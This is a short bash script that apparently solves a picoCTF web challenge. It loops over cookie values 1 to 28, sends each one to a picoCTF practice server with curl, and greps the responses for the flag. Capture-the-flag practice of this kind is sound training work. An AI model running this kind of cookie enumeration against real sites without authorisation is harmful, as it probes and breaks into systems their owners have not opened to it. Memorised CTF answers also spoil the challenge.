#!/bin/bash

for i in {1..28}; do curl -s --cookie "name=$i" "http://mercury.picoctf.net:17781/check" | grep picoCTF{.*}; done
